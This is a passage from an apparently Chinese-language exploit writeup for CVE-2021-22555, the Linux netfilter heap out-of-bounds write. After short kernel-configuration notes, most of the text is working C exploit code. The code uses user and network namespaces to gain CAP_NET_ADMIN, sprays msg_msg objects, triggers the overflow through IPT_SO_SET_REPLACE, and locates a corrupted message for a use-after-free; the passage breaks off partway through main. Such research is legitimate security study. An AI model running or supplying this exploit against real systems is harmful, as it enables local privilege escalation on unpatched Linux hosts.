+这个我是看到协会学长 <strong>@veritas501</strong> 的 <a href=https://github.com/veritas501/pipe-primitive>pipe-primitive</a> 学到的（太强啦）。</li></ol><h2 id=环境搭建><span class=section-num>5</span> 环境搭建</h2><p>这个环境搭建折腾了我很久，我选用的是内核版本是 5.11.14，config 时要把 <code>CONFIG_IP_NF**</code> 和 <code>CONFIG_NETFILTER**</code> 相关的都打开来。但是直接该 .config 编译出来的一直在 setsockopt 上报错。所以我只好 make menuconfig 然后手动一个个打开了。这里我估计是因为我用的是 wsl，所以默认 config 上有一些问题。</p><p>由于触发漏洞需要具有 <code>CPA_NET_ADMIN</code> 权限，所以需要开启 <code>CONFIG_USER_NS</code> 和 <code>CONFIG_NET_NS</code> ，这样我们才能通过 <code>unshare</code> 出名称空间然后获得该权限。</p><p>同时要注意，要开启 <code>CONFIG_CHECKPOINT_RESTORE</code> 这个选项。不然在搜索 <code>msg_msg</code> 的时候会返回 <code>ENOSYS</code> 。</p><p>另外，对于 linux security modules 的开启（ <code>CONFIG_LSM</code> ），也要注意。我最后是参考的 bsauce 师傅提供的<a href=https://github.com/bsauce/kernel-exploit-factory/blob/main/CVE-2021-22555/config#L10192>内核 config</a>。（应该是默认就是这个，可能因为我是在 wsl 中编译的，所以配置的时候自动配进去了一堆别的模块，导致我在 oob read 的时候一直在 <code>security_msg_queue_msgrcv</code> 中 crash。）</p><h2 id=exp><span class=section-num>6</span> exp</h2><p><a id=code-snippet--exp-for-cve-2021-22555.c></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// gcc -m32 -static exp.c -o exp
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020>#define _GNU_SOURCE
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;assert.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sched.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;errno.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/types.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ipc.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/msg.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/socket.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;net/if.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;netinet/in.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> list_head {
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int64_t</span> next, prev;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> msg_msgseg {
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int64_t</span> next;
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* the next part of the message follows immediately */</span>
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> msg_msg {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> list_head m_list;
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int64_t</span> m_type;
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int64_t</span> m_ts;  <span style=color:#60a0b0;font-style:italic>/* message text size */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int64_t</span> next;  <span style=color:#60a0b0;font-style:italic>// struct msg_msgseg*
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>u_int64_t</span> security;
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* the actual message follows immediately */</span>
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> pipe_buffer {
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int64_t</span> page;
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int32_t</span> offset, len;
+</span></span><span style=display:flex><span>  <span style=color:#902000>uint64_t</span> ops;
+</span></span><span style=display:flex><span>  <span style=color:#902000>uint32_t</span> flags;
+</span></span><span style=display:flex><span>  <span style=color:#902000>uint64_t</span> private;
+</span></span><span style=display:flex><span>} <span style=color:#06287e>__attribute__</span>((<span style=color:#06287e>aligned</span>(<span style=color:#40a070>8</span>)));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define FIRST_MSG_SIZE (0x1000 - sizeof(struct msg_msg))
+</span></span></span><span style=display:flex><span><span style=color:#007020>#define SECOND_MSG_SIZE (0x400 - sizeof(struct msg_msg))
+</span></span></span><span style=display:flex><span><span style=color:#007020>#define SOCKET_SUM 16
+</span></span></span><span style=display:flex><span><span style=color:#007020>#define PIPE_SUM 256
+</span></span></span><span style=display:flex><span><span style=color:#007020>#define SK_BUFF_IN_ONE_SOCKET 128
+</span></span></span><span style=display:flex><span><span style=color:#007020>#define N_SPRAY_MSGMSG 0x2000
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> first_msg {
+</span></span><span style=display:flex><span>  <span style=color:#902000>long</span> message_type;
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int8_t</span> message[FIRST_MSG_SIZE];
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> second_msg {
+</span></span><span style=display:flex><span>  <span style=color:#902000>long</span> message_type;
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int8_t</span> message[SECOND_MSG_SIZE];
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> msgids[N_SPRAY_MSGMSG];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>char</span> buf[FIRST_MSG_SIZE <span style=color:#666>*</span> <span style=color:#40a070>2</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>cleanup_msgs</span>() {
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] cleaning up msg_msg..</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_MSGMSG; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>msgctl</span>(msgids[i], IPC_RMID, <span style=color:#007020>NULL</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>err_exit</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>str) {
+</span></span><span style=display:flex><span>  <span style=color:#06287e>perror</span>(str);
+</span></span><span style=display:flex><span>  <span style=color:#06287e>cleanup_msgs</span>();
+</span></span><span style=display:flex><span>  <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>secondMsgSend</span>(<span style=color:#902000>int</span> msgid, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>content, <span style=color:#902000>int</span> msgtype) {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> second_msg msg;
+</span></span><span style=display:flex><span>  msg.message_type <span style=color:#666>=</span> msgtype;
+</span></span><span style=display:flex><span>  <span style=color:#06287e>memcpy</span>(msg.message, content, SECOND_MSG_SIZE);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>msgsnd</span>(msgid, <span style=color:#666>&amp;</span>msg, SECOND_MSG_SIZE, <span style=color:#40a070>0</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgsnd&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>firstMsgSend</span>(<span style=color:#902000>int</span> msgid, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>content, <span style=color:#902000>int</span> msgtype) {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> first_msg msg;
+</span></span><span style=display:flex><span>  msg.message_type <span style=color:#666>=</span> msgtype;
+</span></span><span style=display:flex><span>  <span style=color:#06287e>memcpy</span>(msg.message, content, FIRST_MSG_SIZE);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>msgsnd</span>(msgid, <span style=color:#666>&amp;</span>msg, FIRST_MSG_SIZE, <span style=color:#40a070>0</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgsnd&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>triggerOob</span>(<span style=color:#902000>int</span> socket_fd) {
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// adapted from
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>// https://github.com/google/security-research/security/advisories/GHSA-xxx5-8mvq-3528
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#06287e>__attribute__</span>((__packed__)) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> ipt_replace replace;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> ipt_entry entry;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> xt_entry_match match;
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span> pad[<span style=color:#40a070>0xFB6</span> <span style=color:#666>-</span> <span style=color:#40a070>172</span> <span style=color:#666>-</span> <span style=color:#40a070>4</span>];
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> xt_entry_target target;
+</span></span><span style=display:flex><span>  } data <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data.replace.num_counters <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>  data.replace.num_entries <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>  data.replace.size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.entry) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.match) <span style=color:#666>+</span>
+</span></span><span style=display:flex><span>                      <span style=color:#007020;font-weight:700>sizeof</span>(data.pad) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.target);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data.entry.next_offset <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.entry) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.match) <span style=color:#666>+</span>
+</span></span><span style=display:flex><span>                           <span style=color:#007020;font-weight:700>sizeof</span>(data.pad) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.target);
+</span></span><span style=display:flex><span>  data.entry.target_offset <span style=color:#666>=</span>
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>sizeof</span>(data.entry) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.match) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.pad);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data.match.u.user.match_size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.match) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.pad);
+</span></span><span style=display:flex><span>  <span style=color:#06287e>strcpy</span>(data.match.u.user.name, <span style=color:#4070a0>&#34;icmp&#34;</span>);
+</span></span><span style=display:flex><span>  data.match.u.user.revision <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data.target.u.user.target_size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.target);
+</span></span><span style=display:flex><span>  <span style=color:#06287e>strcpy</span>(data.target.u.user.name, <span style=color:#4070a0>&#34;NFQUEUE&#34;</span>);
+</span></span><span style=display:flex><span>  data.target.u.user.revision <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// partial overwrite the next object
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>setsockopt</span>(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, <span style=color:#666>&amp;</span>data, <span style=color:#007020;font-weight:700>sizeof</span>(data))) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (errno <span style=color:#666>==</span> ENOPROTOOPT) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;ip_tables module is not loaded!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;error: %d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, errno);
+</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] setsockopt&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>sk_buff_spray</span>(<span style=color:#902000>int</span> sk_socket[SOCKET_SUM][<span style=color:#40a070>2</span>], <span style=color:#902000>void</span> <span style=color:#666>*</span>buf, <span style=color:#902000>size_t</span> size) {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> SOCKET_SUM; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> j <span style=color:#666>=</span> <span style=color:#40a070>0</span>; j <span style=color:#666>&lt;</span> SK_BUFF_IN_ONE_SOCKET; j<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>write</span>(sk_socket[i][<span style=color:#40a070>0</span>], buf, size) <span style=color:#666>!=</span> size) {
+</span></span><span style=display:flex><span>        <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] write sk_buff&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>sk_buff_free</span>(<span style=color:#902000>int</span> sk_socket[SOCKET_SUM][<span style=color:#40a070>2</span>], <span style=color:#902000>void</span> <span style=color:#666>*</span>buf, <span style=color:#902000>size_t</span> size) {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> SOCKET_SUM; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> j <span style=color:#666>=</span> <span style=color:#40a070>0</span>; j <span style=color:#666>&lt;</span> SK_BUFF_IN_ONE_SOCKET; j<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>read</span>(sk_socket[i][<span style=color:#40a070>1</span>], buf, size) <span style=color:#666>!=</span> size) {
+</span></span><span style=display:flex><span>        <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] read sk_buff&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>() {
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>unshare</span>(CLONE_NEWUSER)) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] unshare(CLONE_NEWUSER)&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>unshare</span>(CLONE_NEWNET)) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] unshare(CLONE_NEWNET)&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> socket_fd;
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> sk_sockets[SOCKET_SUM][<span style=color:#40a070>2</span>];
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> pipe_fds[PIPE_SUM][<span style=color:#40a070>2</span>];
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ((socket_fd <span style=color:#666>=</span> <span style=color:#06287e>socket</span>(AF_INET, SOCK_STREAM, <span style=color:#40a070>0</span>)) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] socket&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> SOCKET_SUM; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>socketpair</span>(AF_UNIX, SOCK_STREAM, <span style=color:#40a070>0</span>, sk_sockets[i]) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] socketpair&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// https://stackoverflow.com/questions/280909/how-to-set-cpu-affinity-for-a-process-from-c-or-c-in-linux
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>cpu_set_t</span> cpu_mask;
+</span></span><span style=display:flex><span>  <span style=color:#06287e>CPU_ZERO</span>(<span style=color:#666>&amp;</span>cpu_mask);
+</span></span><span style=display:flex><span>  <span style=color:#06287e>CPU_SET</span>(<span style=color:#40a070>0</span>, <span style=color:#666>&amp;</span>cpu_mask);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>sched_setaffinity</span>((__pid_t)<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, (<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>cpu_set_t</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>cpu_mask)) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] sched_setaffinity&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(buf, <span style=color:#40a070>0x00</span>, <span style=color:#007020;font-weight:700>sizeof</span>(buf));
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// spray heap with msg_msg
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] start msg_msg spraying..</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_MSGMSG; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    msgids[i] <span style=color:#666>=</span> <span style=color:#06287e>msgget</span>(IPC_PRIVATE, <span style=color:#40a070>0666</span> <span style=color:#666>|</span> IPC_CREAT);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (msgids[i] <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgget&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_MSGMSG; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>firstMsgSend</span>(
+</span></span><span style=display:flex><span>        msgids[i], buf,
+</span></span><span style=display:flex><span>        N_SPRAY_MSGMSG <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#666>+</span> i);  <span style=color:#60a0b0;font-style:italic>// this id is for the sake of debugging
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_MSGMSG; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    ((<span style=color:#902000>int</span> <span style=color:#666>*</span>)buf)[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> i;
+</span></span><span style=display:flex><span>    <span style=color:#06287e>secondMsgSend</span>(msgids[i], buf, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] msg_msg spraying done!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define HOLE_STEP 0x200
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> N_SPRAY_MSGMSG <span style=color:#666>/</span> <span style=color:#40a070>2</span> <span style=color:#666>+</span> HOLE_STEP; i <span style=color:#666>&lt;</span> N_SPRAY_MSGMSG;
+</span></span><span style=display:flex><span>       i <span style=color:#666>+=</span> HOLE_STEP) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>msgrcv</span>(msgids[i], buf, FIRST_MSG_SIZE, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// oob
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] triggering oob</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#06287e>triggerOob</span>(socket_fd);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// find the msg that can be uaf
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>int</span> first_id <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>, second_id <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_MSGMSG; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>%</span> HOLE_STEP <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>continue</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>msgrcv</span>(msgids[i], buf, SECOND_MSG_SIZE, <span style=color:#40a070>1</span>, MSG_COPY <span style=color:#666>|</span> IPC_NOWAIT) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgrcv&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (((<span style=color:#902000>int</span> <span style=color:#666>*</span>)buf)[<span style=color:#40a070>1</span>] <span style=color:#666>!=</span> i) {
+</span></span><span style=display:flex><span>      first_id <span style=color:#666>=</span> i;
+</span></span><span style=display:flex><span>      second_id <span style=color:#666>=</span> ((<span style=color:#902000>int</span> <span style=color:#666>*</span>)buf)[<span style=color:#40a070>1</span>];
+</span></span><span style=display:flex><span>      <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] found UAF target: first id 0x%x, second id 0x%x</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, first_id,
+</span></span><span style=display:flex><span>             second_id);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (first_id <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] failed to oob msg_msg&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
